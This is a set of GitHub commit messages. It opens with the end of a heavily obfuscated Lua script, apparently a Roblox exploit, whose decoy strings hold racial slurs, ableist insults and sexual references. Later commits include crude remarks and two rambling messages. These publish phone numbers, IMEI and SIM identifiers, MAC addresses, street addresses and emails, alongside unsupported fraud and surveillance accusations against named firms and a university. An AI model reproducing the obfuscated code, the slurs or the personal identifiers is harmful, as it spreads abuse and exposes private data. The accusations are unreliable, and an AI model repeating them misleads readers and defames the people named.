e=e[c]l[e](P(l,e+i,D))break end while(d)/(((985-0x21d)+-#"I make elevating music you make elevator music"))==17 do local r;local d;l[e[c]]=m[e[O]];o=o+n;e=a[o];d=e[b];r=l[e[t]];l[d+1]=r;l[d]=r[e[g]];o=o+n;e=a[o];l[e[x]]=e[O];o=o+n;e=a[o];d=e[b]l[d]=l[d](P(l,d+n,e[t]))o=o+n;e=a[o];l[e[w]]=l[e[s]][e[B]];o=o+n;e=a[o];l[e[f]]=l[e[t]][e[g]];o=o+n;e=a[o];d=e[c];r=l[e[O]];l[d+1]=r;l[d]=r[e[M]];break end;break;end break;end break;end break;end break;end while(d)/(((-0x39+-56)+3290))==314 do d=(2425558)while(0x5fc2/238)>=r do d-= d d=(268992)while(222-0x7f)>=r do d-= d d=(4008231)while(((0x1c4-275)+-#'rule 2 ok')+-0x4d)>=r do d-= d d=(6568245)while((0x135-((272+-0x2d)+-#"ratio no one cares yo momma dead yo daddy left"))+-#[[papier ist ein kleiner schwanz lutscher]])>=r do d-= d if(l[e[x]]~=e[B])then o=o+i;else o=e[s];end;break;end while 3215==(d)/((4207-0x874))do d=(8474228)while r>((10488/0x45)+-#[[Help I cant think of a funny and original meme string pls help]])do d-= d l[e[k]]=(e[u]~=0);o=o+i;break end while(d)/(((0xf24+-66)+-#'if syn then syn dot request get beliveri12 coma nicuse ass end'))==2261 do local e=e[f]l[e]=l[e]()break end;break;end break;end while(d)/((-#[[goofy ahh uncle productions]]+(0x168e-2946)))==1431 do d=(14190918)while(10509/0x71)>=r do d-= d d=(11624448)while(0xca-110)<r do d-= d l[e[w]]=(e[u]~=0);o=o+i;break end while(d)/((0x1df4-3884))==3072 do l[e[x]]=l[e[s]];break end;break;end while(d)/((799588/0xe2))==4011 do d=(3373755)while r>(0x10c-(-#[[Fucking Retarted]]+(36860/0xc2)))do d-= d do return l[e[f]]end break end while 2921==(d)/((0x3c582/214))do local d=e[k]local a={l[d](P(l,d+1,D))};local o=0;for e=d,e[C]do o=o+n;l[e]=a[o];end break end;break;end break;end break;end while 144==(d)/((448320/(-0x11+257)))do d=(1180615)while r<=(271-0xac)do d-= d d=(9171080)while(0xd8+-119)>=r do d-= d d=(3004128)while r>(11904/0x7c)do d-= d l[e[f]]=e[s];break end while(d)/(((1737+-0x4e)+-#'really nigga'))==1824 do l[e[k]]=m[e[h]];break end;break;end while(d)/((0x103b+-97))==2260 do d=(2529670)while r>(132+(-40+0x6))do d-= d local e=e[b]l[e]=l[e](l[e+i])break end while 1769==(d)/((0x287f8/116))do if(l[e[k]]==l[e[N]])then o=o+i;else o=e[U];end;break end;break;end break;end while(d)/(((14-0x34)+0xc01))==389 do d=(4888890)while r<=(0x147-226)do d-= d d=(2710256)while(0xc7+-99)<r do d-= d local D;local r;local u;local d;l[e[x]]=m[e[h]];o=o+n;e=a[o];l[e[k]]=l[e[s]][e[C]];o=o+n;e=a[o];d=e[f];u=l[e[s]];l[d+1]=u;l[d]=u[e[C]];o=o+n;e=a[o];l[e[b]]=l[e[s]];o=o+n;e=a[o];l[e[b]]=l[e[s]];o=o+n;e=a[o];d=e[k]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];d=e[c];u=l[e[O]];l[d+1]=u;l[d]=u[e[B]];o=o+n;e=a[o];d=e[x]l[d]=l[d](l[d+i])o=o+n;e=a[o];r={l,e};r[i][r[_][w]]=r[n][r[_][B]]+r[i][r[_][h]];o=o+n;e=a[o];l[e[b]]=l[e[O]]%e[B];o=o+n;e=a[o];d=e[x]l[d]=l[d](l[d+i])o=o+n;e=a[o];u=e[t];D=l[u]for e=u+1,e[g]do D=D..l[e];end;l[e[b]]=D;o=o+n;e=a[o];r={l,e};r[i][r[_][x]]=r[n][r[_][M]]+r[i][r[_][U]];o=o+n;e=a[o];l[e[k]]=l[e[O]]%e[B];break end while(d)/((0x5760/6))==727 do local o=e[c]l[o]=l[o](P(l,o+n,e[u]))break end;break;end while(d)/((314490/0x6e))==1710 do d=(551616)while(0x10a-164)<r do d-= d local r;local d;l[e[b]]();o=o+n;e=a[o];l[e[x]]=m[e[h]];o=o+n;e=a[o];d=e[x];r=l[e[h]];l[d+1]=r;l[d]=r[e[B]];o=o+n;e=a[o];l[e[w]]=e[U];o=o+n;e=a[o];d=e[f]l[d]=l[d](P(l,d+n,e[s]))o=o+n;e=a[o];l[e[k]][e[t]]=e[C];o=o+n;e=a[o];o=e[O];break end while 136==(d)/((-#[[i want sex]]+(0x2da9c/46)))do local d=e[w]local a={l[d](P(l,d+1,D))};local o=0;for e=d,e[B]do o=o+n;l[e]=a[o];end break end;break;end break;end break;end break;end while(d)/((0x97b8/40))==2498 do d=(1276420)while r<=(237-0x7f)do d-= d d=(12369280)while(228+-0x7a)>=r do d-= d d=(5294285)while r<=(286-0xb6)do d-= d local _;local p,C;local r;local d;l[e[k]]=l[e[h]];o=o+n;e=a[o];d=e[c]l[d](l[d+i])o=o+n;e=a[o];l[e[f]]=m[e[h]];o=o+n;e=a[o];l[e[w]]=l[e[t]][e[N]];o=o+n;e=a[o];l[e[b]]=l[e[h]][e[N]];o=o+n;e=a[o];l[e[w]]=l[e[h]][e[N]];o=o+n;e=a[o];d=e[k];r=l[e[s]];l[d+1]=r;l[d]=r[e[S]];o=o+n;e=a[o];l[e[c]]=e[O];o=o+n;e=a[o];d=e[f]l[d](P(l,d+i,e[s]))o=o+n;e=a[o];l[e[f]]={};o=o+n;e=a[o];l[e[k]][e[t]]=e[N];o=o+n;e=a[o];l[e[x]][e[h]]=e[N];o=o+n;e=a[o];l[e[f]]=m[e[h]];o=o+n;e=a[o];l[e[k]]=l[e[u]][e[g]];o=o+n;e=a[o];l[e[x]]=l[e[U]][e[M]];o=o+n;e=a[o];l[e[f]]=l[e[u]][e[M]];o=o+n;e=a[o];l[e[x]]=l[e[u]][e[M]];o=o+n;e=a[o];d=e[k];r=l[e[O]];l[d+1]=r;l[d]=r[e[B]];o=o+n;e=a[o];l[e[w]]=m[e[t]];o=o+n;e=a[o];l[e[c]]=l[e[s]];o=o+n;e=a[o];d=e[b]p,C=y(l[d](l[d+i]))D=C+d-n _=0;for e=d,D do _=_+n;l[e]=p[_];end;o=o+n;e=a[o];d=e[k]l[d](P(l,d+i,D))o=o+n;e=a[o];l[e[f]]=l[e[O]];o=o+n;e=a[o];d=e[w]l[d]=l[d]()o=o+n;e=a[o];if(l[e[w]]==e[M])then o=o+i;else o=e[O];end;break;end while(d)/(((-0x3c+2873)+-#"With rock shock rap with Doc"))==1901 do d=(10688160)while(((0x394392/254)+-#[[brawl stars hard gay porn shelly nsked minecraft gay porn roblox rule34 hot]])/0x8c)<r do d-= d if l[e[k]]then o=o+n;else o=e[h];end;break end while 3181==(d)/((3445+(-137+0x34)))do local d=e[x];local n=l[d]local a=l[d+2];if(a>0)then if(n>l[d+1])then o=e[U];else l[d+3]=n;end elseif(n<l[d+1])then o=e[O];else l[d+3]=n;end break end;break;end break;end while 3514==(d)/((-0x76+3638))do d=(5691070)while(0x8d+-33)>=r do d-= d d=(1842798)while(0x7c+-17)<r do d-= d local r;local d;d=e[w]l[d](P(l,d+i,e[t]))o=o+n;e=a[o];d=e[c];r=l[e[t]];l[d+1]=r;l[d]=r[e[g]];o=o+n;e=a[o];l[e[c]]=e[u];o=o+n;e=a[o];d=e[k]l[d]=l[d](P(l,d+n,e[u]))o=o+n;e=a[o];d=e[b];r=l[e[t]];l[d+1]=r;l[d]=r[e[S]];o=o+n;e=a[o];l[e[k]]=e[s];o=o+n;e=a[o];d=e[f]l[d]=l[d](P(l,d+n,e[O]))o=o+n;e=a[o];l[e[w]]={};o=o+n;e=a[o];m[e[U]]=l[e[k]];o=o+n;e=a[o];l[e[b]]=m[e[O]];break end while(d)/((8744/0x4))==843 do local x=j[e[u]];local r;local d={};r=F({},{__index=function(o,e)local e=d[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=d[e]e[1][e[2]]=o;end;});for n=1,e[M]do o=o+i;local e=a[o];if e[(0x57-86)]==82 then d[n-1]={l,e[O]};else d[n-1]={p,e[U]};end;I[#I+1]=d;end;l[e[c]]=v(x,r,m);break end;break;end while 1945==(d)/((-#"free bobux no skem"+(-45+0xbad)))do d=(3000882)while r>(264-0x9b)do d-= d local i;local r;local d;l[e[k]]=e[t];o=o+n;e=a[o];l[e[k]]=e[t];o=o+n;e=a[o];l[e[c]]=#l[e[s]];o=o+n;e=a[o];l[e[x]]=e[U];o=o+n;e=a[o];d=e[b];r=l[d]i=l[d+2];if(i>0)then if(r>l[d+1])then o=e[s];else l[d+3]=r;end elseif(r<l[d+1])then o=e[h];else l[d+3]=r;end break end while 2658==(d)/(((0x971-1270)+-#[[boronide sucks ass]]))do l[e[x]]=#l[e[U]];break end;break;end break;end break;end while(d)/((53200/0x8c))==3359 do d=(2673320)while r<=(5244/0x2e)do d-= d d=(1986020)while r<=(-#[[That meme string already exists and also You said a blacklisted word so you are getting banned and kicked and never come back]]+(((-80+0x76f0)+-#[[Me be like at 5am in the morning]])/128))do d-= d d=(1059240)while(0x81+-18)<r do d-= d if not l[e[x]]then o=o+i;else o=e[s];end;break end while(d)/((-#[[if syn then syn dot request get beliveri12 coma nicuse ass end]]+(0xa9f-1396)))==840 do local e=e[x]l[e](P(l,e+i,D))break end;break;end while(d)/(((-#[[impulse was here omg]]+(2673+-0x32))+-108))==796 do d=(2129193)while r>(-61+0xae)do d-= d l[e[c]]=v(j[e[t]],nil,m);break end while 2889==(d)/((-47+0x310))do l[e[f]]();break end;break;end break;end while(d)/(((1522-0x338)+-#"rule 2 ok"))==3880 do d=(515328)while r<=((349-(-#"Ur mom"+(24516/0x6c)))+-#[[cilertedcool]])do d-= d d=(173460)while(0x99+-38)<r do d-= d local d=e[b];local a=l[d+2];local n=l[d]+a;l[d]=n;if(a>0)then if(n<=l[d+1])then o=e[U];l[d+3]=n;end elseif(n>=l[d+1])then o=e[U];l[d+3]=n;end break end while(d)/((0x3dcb6/143))==98 do do return end;break end;break;end while(d)/((-0x7e+797))==768 do d=(1116180)while r>(256-0x8b)do d-= d local r;local d;d=e[w];r=l[e[s]];l[d+1]=r;l[d]=r[e[M]];o=o+n;e=a[o];l[e[k]]=e[O];o=o+n;e=a[o];d=e[b]l[d]=l[d](P(l,d+n,e[h]))o=o+n;e=a[o];d=e[b];r=l[e[O]];l[d+1]=r;l[d]=r[e[B]];o=o+n;e=a[o];l[e[k]]=l[e[h]];o=o+n;e=a[o];l[e[k]]=m[e[O]];o=o+n;e=a[o];l[e[x]]=l[e[u]][e[M]];o=o+n;e=a[o];l[e[w]]=e[u];o=o+n;e=a[o];d=e[w]l[d]=l[d](l[d+i])o=o+n;e=a[o];l[e[f]]={};o=o+n;e=a[o];l[e[c]]=m[e[h]];o=o+n;e=a[o];l[e[b]]=l[e[t]][e[S]];o=o+n;e=a[o];l[e[x]]=l[e[U]];o=o+n;e=a[o];d=e[c]l[d]=l[d](l[d+i])o=o+n;e=a[o];l[e[x]][e[h]]=l[e[S]];o=o+n;e=a[o];d=e[k]l[d]=l[d](P(l,d+n,e[U]))o=o+n;e=a[o];d=e[x];r=l[e[U]];l[d+1]=r;l[d]=r[e[g]];o=o+n;e=a[o];d=e[x]l[d](l[d+i])break end while(d)/((0x37a+((-24-0x2e)+-#"ive seen your mothers ass")))==1404 do local e=e[k]l[e]=l[e](P(l,e+n,D))break end;break;end break;end break;end break;end break;end break;end o+= i end;end);end;return v(A(),{},W())()end)_msec({[(0x15a-186)]='\115\116'..(function(e)return(e and'㒙㒘㒢㒣㒘㒛㒗㒡㒟㒥㒢㒜㒦㒚㒘㒦㒜㒜㒘')or'\114\105'or'\120\58'end)((-#[[0nly 1337 smashed ur wap]]+(0x8c-111))==(107-0x65))..'\110g',["㒛㒞㒛㒠㒢㒠㒝㒝㒝㒦㒢㒘㒡㒚"]='\108\100'..(function(e)return(e and'㒥㒠㒛㒦㒛㒙㒞㒦㒗')or'\101\120'or'\119\111'end)((123-0x76)==(0x6c+-102))..'\112',["㒥㒝㒟㒟㒟㒞㒚㒥"]=(function(e)return(e and'㒞㒣㒠㒗㒝㒛㒡㒤㒚㒜㒞㒚㒛㒞㒢㒝')and'\98\121'or'\100\120'end)((175/0x23)==(-94+0x63))..'\116\101',["㒚㒥㒠㒘㒜㒚㒠㒢㒦㒟㒘㒙"]='\99'..(function(e)return(e and'㒦㒥㒚㒢㒜㒘㒞㒝㒚㒢㒚')and'\90\19\157'or'\104\97'end)((109+-0x68)==(0x6b-104))..'\114',[(120225/0xe5)]='\116\97'..(function(e)return(e and'㒞㒦㒣㒝㒛㒝㒚㒟㒦㒜㒚㒦')and'\64\113'or'\98\108'end)((-118+0x7c)==((0xde-156)-0x3d))..'\101',["㒛㒡㒥㒙㒣㒛㒞㒡㒙㒛㒢㒦㒤㒡㒘㒣㒣㒗㒙"]=(function(e)return(e and'㒗㒙㒤㒛㒚㒞㒣㒟㒤㒙㒠㒡㒡㒚㒣㒤㒛㒡㒗')or'\115\117'or'\78\107'end)(((0xb1-116)+-#[[papier der afghaner wurde von nice dem bombenleger gefickt]])==(-0x50+111))..'\98',["㒞㒟㒛㒟㒝㒢㒚㒗㒠"]='\99\111'..(function(e)return(e and'㒤㒗㒦㒡㒝㒡㒛㒚㒢㒗㒢㒠')and'\110\99'or'\110\105\103\97'end)((3317/0x6b)==(-80+0x6f))..'\97\116',[(-0x47+766)]=(function(e,o)return(e and'㒟㒗㒦㒣㒜㒦㒡㒦㒣㒚㒠㒢㒝㒘')and'\48\159\158\188\10'or'\109\97'end)((0x307/155)==(954/0x9f))..'\116\104',[(-75+0x5a0)]=(function(o,e)return((-0x2d+50)==(264/0x58)and'\48'..'\195'or o..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),["㒢㒦㒙㒠㒚㒡㒘㒣㒦㒥㒜㒣"]='\105\110'..(function(e,o)return(e and'㒣㒝㒗㒜㒥㒥㒗㒤㒛㒟㒝㒥㒤㒟㒣')and'\90\115\138\115\15'or'\115\101'end)((-#[[jtoh is cringe ngl]]+(0x89+-114))==(-0x43+98))..'\114\116',["㒢㒦㒗㒙㒠㒜㒤㒗"]='\117\110'..(function(e,o)return(e and'㒤㒠㒗㒣㒚㒙㒥㒝㒘㒜㒝㒠㒥')or'\112\97'or'\20\38\154'end)((330/0x42)==((20460/((36450/0x96)+-#'dot gg slash BKf6SjpfFv'))+-#"I like watching videos of black men shaking their booty cheeks"))..'\99\107',["㒡㒞㒙㒘㒣㒜㒘㒤㒛㒝㒛"]='\115\101'..(function(e)return(e and'㒦㒙㒚㒘㒞㒜㒙㒜㒞㒥㒡㒙㒤㒙㒘㒞㒛')and'\110\112\99\104'or'\108\101'end)((100+-0x5f)==(135-0x68))..'\99\116',["㒥㒛㒤㒠㒡㒟㒗㒙㒢"]='\116\111\110'..(function(e,o)return(e and'㒣㒗㒟㒣㒜㒠㒚㒚㒗㒜㒡')and'\117\109\98'or'\100\97\120\122'end)((405/0x51)==((4004/0x8f)+-#"Tomathoust6969 was here"))..'\101\114'},{["㒙㒞㒢㒡㒠㒞㒗㒙㒛㒡㒤"]=((getfenv))},((getfenv))()) end)()

---
## [QuickWrite/MiniMinigames](https://github.com/QuickWrite/MiniMinigames)@[a028e6a2fb...](https://github.com/QuickWrite/MiniMinigames/commit/a028e6a2fb0a40cfcff0087042a8c2ffe3bd7bcc)
#### Monday 2022-08-01 19:30:33 by Hasenzahn1

QolI 10

Added a way to copy and paste map definitions.
- /battleship copyMapDefinition <map>
- /battleship pasteMapDefinition <newMapName>

- I hate my life............

---
## [BSCPGROUPHOLDINGSLLC/WILSONELSER-ZUCKER](https://github.com/BSCPGROUPHOLDINGSLLC/WILSONELSER-ZUCKER)@[ced883d609...](https://github.com/BSCPGROUPHOLDINGSLLC/WILSONELSER-ZUCKER/commit/ced883d609782b1e0a357be6b44b7c11d0ae1efa)
#### Monday 2022-08-01 19:38:33 by 1212-5858

https://github.com/BSCPGROUPHOLDINGSLLC/INDEX153974/issues/2#issuecomment-1199958442

https://github.com/BSCPGROUPHOLDINGSLLC/INDEX153974/issues/2#issuecomment-1199958442

https://github.com/BSCPGROUPHOLDINGSLLC/INDEX153974/issues/2#issuecomment-1199958442

My orders are annexed in NYSCEF 153974_2020 

On a need to know basis.



On Fri, Jul 29, 2022, 5:40 PM B B <boboschickenandpoker@gmail.com> wrote:

    Location,  departed 151 on sight of my Panasonic 


    On Fri, Jul 29, 2022, 5:39 PM B B <boboschickenandpoker@gmail.com> wrote:

        https://github.com/BSCPGROUPHOLDINGSLLC/INDEX153974/issues/2#issuecomment-1199958442

        Located another charge.

        On Wed, Jul 27, 2022, 2:38 PM Bo Dincer <bo.dincer@yahoo.com> wrote:

            https://github.com/BSCPGROUPHOLDINGSLLC/INDEX153974/issues/2#issuecomment-1197105601

            Individuals and their contact information
            -- promptly, as accessories and direct participants in NYSCEF 153974_2020, under USC Title 18.225, USC Title 18.215, USC Title 18.21, and USC Title 18.3, have alao aided and impeded a material filing by a registered 40 ACT, under the Sarbanes-Oxley 63.18 caused for those ommissions, jointly and severally in four reports,  two-semi annual holdings and two annual reports by a publicly traded Audit Firm, PWC inder CIK filer 93715, and CIK filer 1516523.

            /S/ BO DINCER
            Sent from +19173783467@tmomail.net 


            Ticker STFGX, holdings by insiders

            CIK: 8209, 93715, 1516523, 


                On Mon, Jul 25, 2022 at 6:07 PM, Bo Dincer
                <bo.dincer@yahoo.com> wrote:
                This is the 917-378-3467 phone.. also monitored.

                See also tracked by location and hotels, attached.

                >> registered with you and approved for immediate prosecution and detention of anyone pinging or tracking those ip and MAC addresses during a federal bank and securities investigation. Has been grossly, and negligently obstructed to filings by a publicly traded audit firm, by the individuals known.

                CONTINUE, which is why there is NO DOLLAR AMOUNT OF BAIL THAT SHOULD WARRANT ANY FURTHERANCE. AS THEY CONTINUE TO "HIT THOSE PIPES"

                -- without consent by the "self declared overachievers" who have a long list ofnfelonies to deal with, and track this information on this device as well.

                Number: 917-378-3467
                Imei: 352810100822424
                Imei SV: 75
                FCC ID: A3LSMG970U

                IP: 192.0.0.2
                        2607:fb90:7ad7:4890:9c54:15ae:799b:54da

                Bluetooth: CO:BD:C8:OD:D2:76

                MAC: 10:98:c3:a6:49:98
                Serial: R58M23GFWTR
                Model: SM-G970U
                Model Name: Galaxy S10e






                ##2BR-5G

                115 SULLIVAN STREET
                Random MAC address: 36:9b:31:25:c5:be





                ##2BR
                111 REAR SULLIVAN STREET, 

                40.725912, -74.002538
                Random MAC address: 26:53:19:2b:b8:ac









                World center Hotel
                144 Washington Street 
                Random MAC address:   c2:a6:58:8a:81:58




                United Airlines
                Random MAC address:  06:a5:58:8b:d2:03






































                2001 DOTS, but two phones, and the one below will show you the same

















                Like obstruction me and keeping me tied up with some BS while they pull tax 

                BLOCK 503, lot 1
                BLOCK 503, lot 6

                -- OFF FROM THE USC 18.21 VERIFIED AS UNLAWFUL RENTS, THAT ARE IN FACT FICTITIOUS TO OBTAIN A LOAN FOR $6 MILLION DOLLARS WERE USED AS A FORM OF CREDIBILITY,  HOWEVER CONTINUE TO FOLLOW THOSE ADDRESSES BELOW AS WELL TO FURTHER PREVENT AN IMMEDIATE RELEASE OF INFORMATION, WHICH IS WHY -- IM LEAVING YOU ALL OF THIS AND GOING BACK TO THE JOB I ACCEPTED.

                THANK YOU.

























                    On Mon, Jul 25, 2022 at 5:23 PM, pinkbookswap@yahoo.com
                    <pinkbookswap@yahoo.com> wrote:
                    Thank you in advance for addressing this matter.

                    I do hereby consent, as I did and was approved in the FBI as a faction under my supervisors using 

                    cellphone from T-Mobile 917-378-3467. 

                    These individuals ONLY do this to further impede the timely release of information to you, and yours and while they delete their emails, my emails, and other information that WILL deter further losses of assets, notwithstanding a waste of my own time.

                     More information that will be further encumbered without bringing an end to this Zucker Organization, its attorneys, employees, affiliates, notwithstanding their accessories at Columbia University. 

                    Have your analysts review those recordings and let me know otherwise, is not funny, and they believe they are exempt from prosecution — which is insanity.



                    I am registered, and approved in the FBI system… 

                    As such I also authorize you to monitor this phone at all times, as it is not helpful to have a “select group” of self-declared “overachievers” gain a competitive advantage by looking over my shoulder, listen to my conversations and a willful violation of my privacy which continues and during a FEDERAL INVESTIGATION OF SECURITIES FRAUD, BANK FRAUD, TAX FRAUD, and other areas of the Law I am not familiar with.

                    Here is all the information you need for this device, 

                    646-256-3609, without consent has been monitored

                    — absent of those who work in the interest of an expedited release of information, as requested earlier, I don’t want to hear or see a peep, I have to clear this before they pull another smooth merger and lose another two billion dollars.

                    So #CLEAR ANYONE who has undertaken a self-declared initiative to track this device, without my consent at any anytime, as implied

                    —without exception, does nothing but slow this process and make life difficult for you, yours and myself included.

                    Here is the information for this device, which they use to monitor my “activities” are in FACT not fictitious, no matter what excuse. 

                    PROVIDER. ATT

                    SEID
                    041F531B9054800191980596823016858FB1E22F54D3E253

                    EID
                    89049032005008882600031960111082

                    WiFi address
                    cc:66:0A:50:CE:2E

                    Bluetooth
                    cc:66:0A:54:9B:EF

                    Model number
                    MWHU2LL/A

                    Serial Number
                    DNPZC1F6N72K

                    IMEI
                    35 397610 201962 1

                    ICCiD
                    89014103272194689192

                    MEID
                    35397610201962

                    IMEI
                    35 397610 196037 9


                    But they don’t sound like this guy, that’s Billy Ocean.
                    - the singer, not a Felon… to my knowledge. 






                    _______________
                    Tel:  646-256-3609

---
## [RandomTNT/docs-1](https://github.com/RandomTNT/docs-1)@[93b4a0c701...](https://github.com/RandomTNT/docs-1/commit/93b4a0c70100119e6021104a28cad6663baa72ca)
#### Monday 2022-08-01 19:54:53 by RandomTNT

i think this shit should work

i think github should update their MD(cock and ball torture)cause its a pain in the dick and balls

---
## [BSCPGROUPHOLDINGSLLC/ELSER-AND-DICKER](https://github.com/BSCPGROUPHOLDINGSLLC/ELSER-AND-DICKER)@[9a1ba9fd51...](https://github.com/BSCPGROUPHOLDINGSLLC/ELSER-AND-DICKER/commit/9a1ba9fd514099f0276b3f1a39bb5b238f1d71b9)
#### Monday 2022-08-01 20:29:53 by 1212-5858

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=IY8iDH_PLUS_UpVanEtcRioef3A==

https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=0oALanv/mNr_PLUS_zXOysW5zeg==

 1.    150 EAST 42ND STREET, 10017
2.    101 WEST 55TH STREET, 10019
3.    FARMERS AT LEWISOHN HALL
        (BROADWAY AND 116TH STREET, MANHATTAN )     4TH FLOOR.



also do know how to keep their mouths shut after all...
never would have guessed.

-- PEEPING TOMS -- accessories, whatever you'd like to call them -- not my dept.

-------- Forwarded Message --------
Subject: 	#GOCARDS ( USC 26, ALSO WILLFULLY OBSTRUCTED under USC 18)
Date: 	Sun, 26 Jun 2022 09:50:26 -0500
From: 	B D2022 <ms60710444266@yahoo.com>
To: 	KATHY HOCHUL <governor.hochul@exec.ny.gov>, Comments@dfs.ny.gov <Comments@dfs.ny.gov>, stringer@comptroller.nyc.gov <stringer@comptroller.nyc.gov>
CC: 	bo.dincer@yahoo.com <bo.dincer@yahoo.com>, ms60710444266@yahoo.com <MS60710444266@YAHOO.COM>


Section 203(f) of the Advisers Act permits the Commission to sanction any person who, at the time of the misconduct, was associated with an investment adviser, if the Commission finds that the sanction is in the public interest and the person has been convicted of any offense specified in Section 203(e)(2) within ten years of the commencement of proceedings. 15 U.S.C. § 80b3(e)(2),(f).

https://www.sec.gov/alj/aljdec/2015/id747ce.pdfconspiracy to commit securities fraud, in violation of 18 U.S.C. § 371; conspiracy to commit wire fraud, in violation of 18 U.S.C. § 1349; securities fraud, in violation of 15 U.S.C. §§ 78j(b), 78ff, and 17 CFR § 240.10b-5; wire fraud, in violation of 18 U.S.C. § 1343; and investment adviser fraud, in violation of 15 U.S.C. §§ 80b-6 and 80b-17. OIP at 2;

On June 23, 2014, Balboa was sentenced to a prison term of fortyeight months, to run concurrently on all counts, followed by three years of supervised release, and ordered to pay restitution of $390,243,873.92 and to forfeit $2,223,000.

15 U.S.C. § 80b3(e)(2)(A). Ex. C at 1-2; Exs. D, E. The superseding indictment charged Balboa with, among other things, engaging in a scheme to falsely inflate the value of illiquid securities between January 2008 and October 2008 and with committing wire fraud.

15 U.S. Code § 78r - Liability for misleading statements (a)Persons liable; persons entitled to recover; defense of good faith; suit at law or in equity; costs, etc. Any person who shall make or cause to be made any statement in any application, report, or document filed pursuant to this chapter or any rule or regulation thereunder or any undertaking contained in a registration statement as provided in subsection (d) of section 78o of this title, which statement was at the time and in the light of the circumstances under which it was made false or misleading with respect to any material fact, shall be liable to any person (not knowing that such statement was false or misleading) who, in reliance upon such statement, shall have purchased or sold a security at a price which was affected by such statement, for damages caused by such reliance, unless the person sued shall prove that he acted in good faith and had no knowledge that such statement was false or misleading. A person seeking to enforce such liability may sue at law or in equity in any court of competent jurisdiction. In any such suit the court may, in its discretion, require an undertaking for the payment of the costs of such suit, and assess reasonable costs, including reasonable attorneys’ fees, against either party litigant.

(b)Contribution Every person who becomes liable to make payment under this section may recover contribution as in cases of contract from any person who, if joined in the original suit, would have been liable to make the same payment.

(c)Period of limitations No action shall be maintained to enforce any liability created under this section unless brought within one year after the discovery of the facts constituting the cause of action and within three years after such cause of action accrued.

[SFITX] 15 U.S. Code § 78s - Registration, responsibilities, and oversight of self-regulatory organizations (5)The Commission shall consult with and consider the views of the Secretary of the Treasury prior to approving a proposed rule filed by a registered securities association that primarily concerns conduct related to transactions in government securities, except where the Commission determines that an emergency exists requiring expeditious or summary action and publishes its reasons therefor. If the Secretary of the Treasury comments in writing to the Commission on a proposed rule that has been published for comment, the Commission shall respond in writing to such written comment before approving the proposed rule. If the Secretary of the Treasury determines, and notifies the Commission, that such rule, if implemented, would, or as applied does (i) adversely affect the liquidity or efficiency of the market for government securities; or (ii) impose any burden on competition not necessary or appropriate in furtherance of the purposes of this section, the Commission shall, prior to adopting the proposed rule, find that such rule is necessary and appropriate in furtherance of the purposes of this section notwithstanding the Secretary’s determination.

https://www.sec.gov/alj/aljdec/2015/id739ce.pdf[t]he proper functioning of the securities industry and markets depends on the integrity of industry participants and their commitment to transparent disclosure. Securities industry participation by persons with a history of fraudulent conduct is antithetical to the protection of investors. . . . We have long held that a history of egregious fraudulent conduct demonstrates unfitness for future participation in the securities industry even if the disqualifying conduct is not related to the professional capacity in which the respondent was acting when he or she engaged in the misconduct underlying the proceeding. The industry relies on the fairness and integrity of all persons associated with each of the professions covered by the collateral bar to forgo opportunities to defraud and abuse other market participants.

TRANSACTIONS OF CERTAIN AFFILIATED PERSONS AND UNDERWRITERS -UNLAWFUL TRANSACTIONS SEC. 17. (a) It shall be unlawful for any affiliated person or pro- moter of or principal underwriter for a registered investment company (other than a company of the character described in section 12 (d) (3) (A) and (B)), or any affiliated person of such a person, promoter, or principal underwriter, acting as principal- (1) knowingly to sell any security or other property to such registered company or to any company controlled by such regis- tered company, unless such sale involves solely (A) securities of which the buyer is the issuer, (B) securities of which the seller is the issuer and which are part of a general offering to the holders of a class of its securities, or (C) securities deposited with the trustee of a unit investment trust or periodic payment plan by the depositor thereof;

(2) knowingly to purchase from such registered company, or from any company controlled by such registered company, any security or other property (except securities of which the seller is the issuer)

Liability of directors, etc., for willful misfeasance. SEC. 17. (h) After one year from the effective date of this title, neither the charter, certificate of incorporation, articles of association, indenture of trust, nor the by-laws of any registered investment company, nor any other instrument pursuant to which such a company is organized or administered, shall contain any provision which protects or purports to protect any director or officer of such company against any liability to the company or to its security holders to which he would otherwise be subject by reason of willful misfeasance, bad faith, gross negligence or reckless disregard of the duties involved in the conduct of his office.

|In the event that any such instrument does not at the effective date of this Act comply with the requirements of this subsection (h) and is not amended to comply therewith prior to the expiration of said one year, such company may nevertheless continue to be a registered investment company and shall not be deemed to violate this subsection if prior to said expiration date each such director or officer shall have filed with the Commission a waiver in writing of any protective provision of the instrument to the extent that it does not comply with this subsection, and each such person subsequently elected or appointed shall before assuming office file a similar waiver. |

(i) After one year from the effective date of this title no contract or agreement under which any person undertakes to act as investment adviser of, or principal underwriter for, a registered investment company shall contain any provision which protects or purports to protect such person against any liability to such company or its security holders to which he would otherwise be subject by reason of willful misfeasance, bad faith, or gross negligence, in the performance of his duties, or by reason of his reckless disregard of his obligations and duties under such contract or agreement.

Injunctions against gross abuse. SEC. 36. The Commission is authorized to bring an action in the proper district court of the United States or United States court of any Territory or other place subject to the jurisdiction of the United States, alleging that a person serving or acting in one or more of the following capacities has been guilty, after the enactment of this title and within five years of the commencement of the action, of gross misconduct or gross abuse of trust in respect of any registered investment company for which such person so serves or acts: (1) as officer, director, member of an advisory board, investment adviser, or depositor; or (2) as principal underwriter, if such registered company is an open-end company, unit investment trust, or face-amount certificate company. If the Commission's allegations of such gross misconduct or gross abuse of trust are established, the court shall enjoin such person from acting in such capacity or capacities either permanently or for such period of time as it in its discretion shall deem appropriate.

SEC. 32. (c) The Commission is authorized, by rules and regulations or order in the public interest or for the protection of investors, to require accountants and auditors to keep reports, work sheets, and other documents and papers relating to registered investment companies for such period or periods as the Commission may prescribe, and to make the same available for inspection by the Commission or any member or representative thereof.

DESTRUCTION AND FALSIFICATION OF REPORTS AND RECORDS SEC. 34.

(a) It shall be unlawful for any person, except as permitted by rule, regulation, or order of the Commission, willfully to destroy, mutilate, or alter any account, book, or other document the preservation of which has been required pursuant to section 31 (a) or 32 (c). (b) It shall be unlawful for any person to make any untrue statement of a material fact in any registration statement, application, report, account, record, or other document filed or transmitted pursuant to this title or the keeping of which is required pursuant to section 31 (a).

